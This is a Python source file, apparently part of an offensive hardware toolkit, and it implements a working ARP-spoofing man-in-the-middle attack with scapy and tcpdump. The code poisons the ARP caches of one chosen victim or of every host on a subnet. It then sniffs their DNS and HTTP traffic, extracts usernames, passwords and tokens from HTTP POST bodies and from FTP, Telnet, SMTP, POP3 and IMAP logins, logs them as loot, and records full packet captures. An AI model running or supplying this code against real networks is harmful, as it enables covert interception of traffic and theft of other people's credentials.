"""MITM — ARP spoofing man-in-the-middle attack.

Ported from JanOS. Poisons ARP caches to intercept traffic between
victim(s) and the gateway. Captures DNS/HTTP/credentials live + pcap.
Runs entirely on the uConsole (scapy + tcpdump), does NOT use ESP32 serial.
"""

import os
import re
import socket
import struct
import subprocess
import threading
import time
from datetime import datetime


class MITMAttack:
    """MITM ARP spoofing — headless (no urwid)."""

    def __init__(self, msg_fn=None, loot=None):
        self._msg = msg_fn or (lambda *a: None)
        self._loot = loot
        self._running = False
        self._spoof_thread: threading.Thread | None = None
        self._sniff_thread: threading.Thread | None = None
        self._tcpdump_proc: subprocess.Popen | None = None
        self._pcap_path = ""
        self._iface = ""
        self._gateway_ip = ""
        self._gateway_mac = ""
        self._victims: list[tuple[str, str]] = []
        self._orig_ip_forward = "0"
        self.packets = 0

    @property
    def running(self) -> bool:
        return self._running

    # -- Network helpers --

    @staticmethod
    def get_interfaces() -> list[tuple[str, str]]:
        result: list[tuple[str, str]] = []
        try:
            import netifaces
            for iface in netifaces.interfaces():
                if iface == "lo":
                    continue
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    for a in addrs[netifaces.AF_INET]:
                        result.append((iface, a.get("addr", "")))
        except ImportError:
            try:
                out = subprocess.run(
                    ["ip", "-4", "-o", "addr", "show"],
                    capture_output=True, text=True, timeout=5).stdout
                for line in out.splitlines():
                    parts = line.split()
                    if len(parts) >= 4:
                        iface = parts[1]
                        ip = parts[3].split("/")[0]
                        if iface != "lo":
                            result.append((iface, ip))
            except Exception:
                pass
        return result

    @staticmethod
    def get_default_gateway() -> str:
        try:
            with open("/proc/net/route") as f:
                for line in f:
                    fields = line.strip().split()
                    if len(fields) < 3:
                        continue
                    if fields[1] != "00000000":
                        continue
                    if not int(fields[3], 16) & 2:
                        continue
                    packed = int(fields[2], 16)
                    return socket.inet_ntoa(struct.pack("<I", packed))
        except Exception:
            pass
        return ""

    @staticmethod
    def get_mac(ip: str, iface: str, timeout: int = 3) -> str:
        try:
            from scapy.all import ARP, Ether, srp
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=iface, timeout=timeout, verbose=0)
            if ans:
                return ans[0][1].hwsrc
        except Exception:
            pass
        return ""

    def arp_scan(self, subnet: str, iface: str) -> list[tuple[str, str]]:
        hosts: list[tuple[str, str]] = []
        try:
            from scapy.all import ARP, Ether, srp
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
                iface=iface, timeout=3, verbose=0)
            for sent, received in ans:
                hosts.append((received.psrc, received.hwsrc))
        except Exception as e:
            self._msg(f"[MITM] ARP scan error: {e}")
        return hosts

    @staticmethod
    def get_subnet(iface: str) -> str:
        try:
            out = subprocess.run(
                ["ip", "-4", "-o", "addr", "show", iface],
                capture_output=True, text=True, timeout=5).stdout
            for line in out.splitlines():
                m = re.search(r'inet\s+(\S+)', line)
                if m:
                    return m.group(1)
        except Exception:
            pass
        return "192.168.1.0/24"

    # -- IP forwarding --

    def _enable_ip_forward(self) -> None:
        try:
            with open("/proc/sys/net/ipv4/ip_forward") as f:
                self._orig_ip_forward = f.read().strip()
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            self._msg("[MITM] IP forwarding enabled")
        except PermissionError:
            subprocess.run(
                ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
                capture_output=True, timeout=5)

    def _restore_ip_forward(self) -> None:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(self._orig_ip_forward)
        except Exception:
            try:
                subprocess.run(
                    ["sudo", "sysctl", "-w",
                     f"net.ipv4.ip_forward={self._orig_ip_forward}"],
                    capture_output=True, timeout=5)
            except Exception:
                pass

    # -- ARP spoofing --

    def _spoof_loop(self) -> None:
        try:
            from scapy.all import ARP, Ether, sendp
        except ImportError:
            self._msg("[MITM] ERROR: scapy not installed")
            self._running = False
            return

        gw_ip = self._gateway_ip
        gw_mac = self._gateway_mac

        while self._running:
            try:
                for victim_ip, victim_mac in self._victims:
                    pkt_v = Ether(dst=victim_mac) / ARP(
                        op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gw_ip)
                    pkt_g = Ether(dst=gw_mac) / ARP(
                        op=2, pdst=gw_ip, hwdst=gw_mac, psrc=victim_ip)
                    sendp(pkt_v, iface=self._iface, verbose=0)
                    sendp(pkt_g, iface=self._iface, verbose=0)
                time.sleep(1)
            except Exception as e:
                self._msg(f"[MITM] ARP error: {e}")
                time.sleep(2)

    def _restore_arp(self) -> None:
        try:
            from scapy.all import ARP, Ether, sendp
        except ImportError:
            return
        for victim_ip, victim_mac in self._victims:
            pkt_v = Ether(dst=victim_mac) / ARP(
                op=2, pdst=victim_ip, hwdst=victim_mac,
                psrc=self._gateway_ip, hwsrc=self._gateway_mac)
            pkt_g = Ether(dst=self._gateway_mac) / ARP(
                op=2, pdst=self._gateway_ip, hwdst=self._gateway_mac,
                psrc=victim_ip, hwsrc=victim_mac)
            sendp(pkt_v, iface=self._iface, verbose=0, count=5)
            sendp(pkt_g, iface=self._iface, verbose=0, count=5)
        self._msg("[MITM] ARP tables restored")

    # -- Packet sniffer --

    def _sniff_loop(self) -> None:
        try:
            from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Raw
        except ImportError:
            return

        victim_ips = {ip for ip, _ in self._victims}
        bpf = " or ".join(f"host {ip}" for ip in victim_ips)

        def process(pkt):
            if not self._running:
                return
            self.packets += 1
            try:
                if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
                    qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
                    src = pkt[IP].src if pkt.haslayer(IP) else "?"
                    self._msg(f"[DNS] {src} -> {qname}")
                    return

                if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
                    return

                load = pkt[Raw].load
                dport = pkt[TCP].dport

                if dport == 80:
                    try:
                        text = load.decode(errors="ignore")
                        lines = text.split("\r\n")
                        if lines and lines[0].startswith(("GET ", "POST ", "PUT ")):
                            method = lines[0].split(" HTTP")[0]
                            self._msg(f"[HTTP] {method}")
                            if method.startswith("POST"):
                                body_start = text.find("\r\n\r\n")
                                if body_start > 0:
                                    body = text[body_start + 4:]
                                    cred_kw = ("user", "pass", "login", "email",
                                               "pwd", "auth", "token")
                                    if any(k in body.lower() for k in cred_kw):
                                        self._msg(f"[CREDS] {body[:100]}")
                                        if self._loot:
                                            self._loot.log_attack_event(
                                                f"MITM_CREDS: {body[:300]}")
                    except Exception:
                        pass
                    return

                if dport in (21, 23, 25, 110, 143):
                    proto_map = {21: "FTP", 23: "Telnet", 25: "SMTP",
                                 110: "POP3", 143: "IMAP"}
                    proto = proto_map.get(dport, str(dport))
                    try:
                        text = load.decode(errors="ignore").strip()
                        auth_kw = ("USER", "PASS", "LOGIN", "AUTH")
                        if any(text.upper().startswith(k) for k in auth_kw):
                            self._msg(f"[AUTH/{proto}] {text[:80]}")
                            if self._loot:
                                self._loot.log_attack_event(
                                    f"MITM_AUTH [{proto}]: {text[:200]}")
                    except Exception:
                        pass
            except Exception:
                pass

        try:
            sniff(iface=self._iface, prn=process, store=0,
                  filter=bpf, stop_filter=lambda _: not self._running)
        except Exception as e:
            if self._running:
                self._msg(f"[MITM] Sniffer error: {e}")

    # -- tcpdump --

    def _start_tcpdump(self) -> None:
        if not self._loot:
            return
        mitm_dir = os.path.join(self._loot.session_path, "mitm")
        os.makedirs(mitm_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self._pcap_path = os.path.join(mitm_dir, f"capture_{ts}.pcap")
        victim_filter = " or ".join(f"host {ip}" for ip, _ in self._victims)
        try:
            self._tcpdump_proc = subprocess.Popen(
                ["tcpdump", "-i", self._iface, "-w", self._pcap_path,
                 "-s", "0", victim_filter],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._msg(f"[MITM] tcpdump -> {self._pcap_path}")
        except FileNotFoundError:
            self._msg("[MITM] tcpdump not found")
            self._tcpdump_proc = None

    def _stop_tcpdump(self) -> None:
        if self._tcpdump_proc:
            try:
                self._tcpdump_proc.terminate()
                self._tcpdump_proc.wait(timeout=5)
            except Exception:
                try:
                    self._tcpdump_proc.kill()
                except Exception:
                    pass
            self._tcpdump_proc = None

    # -- Start / stop --

    def start(self, iface: str, victim_ip: str = "",
              target_all: bool = False) -> bool:
        """Start MITM attack.

        iface: network interface (e.g. wlan0)
        victim_ip: single target IP (or empty for target_all)
        target_all: ARP spoof all hosts on subnet
        """
        if self._running:
            return False

        self._iface = iface
        self._gateway_ip = self.get_default_gateway()
        if not self._gateway_ip:
            self._msg("[MITM] Cannot detect gateway")
            return False

        self._gateway_mac = self.get_mac(self._gateway_ip, iface)
        if not self._gateway_mac:
            self._msg(f"[MITM] Cannot resolve gateway MAC ({self._gateway_ip})")
            return False

        if target_all:
            subnet = self.get_subnet(iface)
            self._msg(f"[MITM] Scanning {subnet}...")
            hosts = self.arp_scan(subnet, iface)
            my_ips = {ip for _, ip in self.get_interfaces()}
            self._victims = [(ip, mac) for ip, mac in hosts
                             if ip != self._gateway_ip and ip not in my_ips]
            if not self._victims:
                self._msg("[MITM] No hosts found")
                return False
            self._msg(f"[MITM] Targeting {len(self._victims)} hosts")
        elif victim_ip:
            mac = self.get_mac(victim_ip, iface)
            if not mac:
                self._msg(f"[MITM] Cannot resolve {victim_ip}")
                return False
            self._victims = [(victim_ip, mac)]
        else:
            self._msg("[MITM] No target specified")
            return False

        self._running = True
        self.packets = 0
        self._enable_ip_forward()
        self._start_tcpdump()

        self._spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._spoof_thread.start()

        self._sniff_thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._sniff_thread.start()

        victims = ", ".join(ip for ip, _ in self._victims[:3])
        if len(self._victims) > 3:
            victims += f" +{len(self._victims)-3}"
        self._msg(f"[MITM] Started: {victims} <-> {self._gateway_ip}")

        if self._loot:
            self._loot.log_attack_event(f"STARTED: MITM ({victims} <-> {self._gateway_ip})")
        return True

    def stop(self) -> None:
        if not self._running:
            return
        self._running = False
        self._msg("[MITM] Stopping...")
        self._restore_arp()
        self._stop_tcpdump()
        self._restore_ip_forward()

        if self._spoof_thread:
            self._spoof_thread.join(timeout=3)
            self._spoof_thread = None
        if self._sniff_thread:
            self._sniff_thread.join(timeout=3)
            self._sniff_thread = None

        if self._pcap_path and os.path.exists(self._pcap_path):
            size = os.path.getsize(self._pcap_path)
            self._msg(f"[MITM] Pcap: {self._pcap_path} ({size}B)")

        self._msg(f"[MITM] Stopped. Packets: {self.packets}")
        if self._loot:
            self._loot.log_attack_event(f"STOPPED: MITM (packets: {self.packets})")
